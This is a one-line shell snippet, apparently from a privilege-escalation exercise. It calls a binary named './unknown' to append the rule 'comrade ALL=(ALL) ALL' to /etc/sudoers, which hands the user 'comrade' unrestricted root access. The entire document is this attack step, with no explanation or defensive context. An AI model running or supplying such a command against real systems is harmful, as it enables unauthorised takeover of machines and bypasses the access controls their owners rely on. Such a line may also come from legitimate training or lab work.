```
./unknown /etc/sudoers "comrade ALL=(ALL) ALL"
```

